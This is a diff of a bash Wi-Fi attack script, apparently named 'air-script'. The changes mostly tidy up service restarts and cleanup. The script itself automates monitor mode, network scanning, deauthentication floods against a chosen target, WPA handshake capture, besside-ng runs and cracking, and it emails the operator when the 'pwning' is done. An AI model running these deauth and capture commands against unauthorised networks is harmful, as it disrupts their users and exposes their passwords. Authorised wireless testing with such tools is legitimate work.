@@ -9,13 +9,14 @@ fi
 network () {
 echo "Please, select a network interface:"
 cd /sys/class/net && select foo in *; do echo $foo selected $foo; break; done
-airmon-ng start $foo
+airmon-ng start $foo > /dev/null 2>&1
 echo "Please, select the interface in monitor mode:"
 cd /sys/class/net && select foo in *; do echo $foo selected $foo; break; done
 cd /home/*/air-script
 }
 chmod -R 755 *
-sudo postfix start> /dev/null 2>&1
+sudo postfix start > /dev/null 2>&1
+sudo systemctl start postfix > /dev/null 2>&1
 clear
 Red="\e[1;91m"      ##### Colors Used #####
 Green="\e[0;92m"
@@ -42,7 +43,9 @@ fi
 
 
 checkServices () {
-sudo systemctl start postfix
+sudo systemctl start postfix > /dev/null 2>&1
+sudo postfix start > /dev/null 2>&1
+sudo systemctl start postfix > /dev/null 2>&1
 
 
 }
@@ -261,7 +264,7 @@ monitor
 sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
 echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
 sudo aireplay-ng --deauth 20 -a $bssid $foo
-sudo airmon-ng stop $foo > /dev/null 2>&1
+sudo airmon-ng stop $foo
 checkServices 
 crack
 
@@ -304,7 +307,7 @@ sudo besside-ng $foo
 stopMon
 checkservices
 sleep 10
-sendemail -f airscript@mail.com -t $email -u "Air Script is done pwning!" -m "Pwn complete, ready for you to crack. This is a robot please do not reply. *BEEP BOOP*"
+sendemail -f airscript@gmail.com -t $email -u "Air Script is done pwning!" -m "Pwn complete, ready for you to crack. This is a robot please do not reply. *BEEP BOOP*"
 crack
 }
 
@@ -414,14 +417,12 @@ aireplay-ng --deauth 0 -a $bssid $foo > /dev/null
 }
 
 monitor () {        ##### Monitor mode, scan available networks & select target #####
-#airmon-ng check kill
 spinner &
 airmon-ng start $foo > /dev/null
-trap "airmon-ng stop $foo > /dev/null;rm generated-01.kismet.csv 2> /dev/null" EXIT 
+trap "airmon-ng stop $foo > /dev/null;rm generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT
 airodump-ng --output-format kismet --write generated $foo > /dev/null & sleep 20 ; kill $!
 sed -i '1d' generated-01.kismet.csv
 kill %1
-#airmon-ng stop $foo
 echo -e "\n\n${Red}SerialNo        WiFi Network${White}"
 cut -d ";" -f 3 generated-01.kismet.csv | nl -n ln -w 8
 targetNumber=1000
@@ -429,7 +430,6 @@ while [ ${targetNumber} -gt `wc -l generated-01.kismet.csv | cut -d " " -f 1` ] 
 echo -e "\n${Green}┌─[${Red}Select Target${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
 read -p "└─────►$(tput setaf 7) " targetNumber
 done
-airmon-ng start $foo
 targetName=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 3 `
 bssid=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 4 `
 channel=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 6 `
@@ -889,11 +889,9 @@ sudo ./uninstall.sh
 }
 
 stopMon () {
-sudo airmon-ng stop $foo > /dev/null 2>&1
-sudo service network-mamager start > /dev/null 2>&1
-sudo service network-mamager restart > /dev/null 2>&1
-sudo ifconfig $foo up > /dev/null 2>&1
-sudo wpa_suplicant > /dev/null 2>&1
+sudo airmon-ng stop $foo
+sudo systemctl start NetworkManager > /dev/null 2>&1
+systemctl start wpa_supplicant  > /dev/null 2>&1
 }
 
 
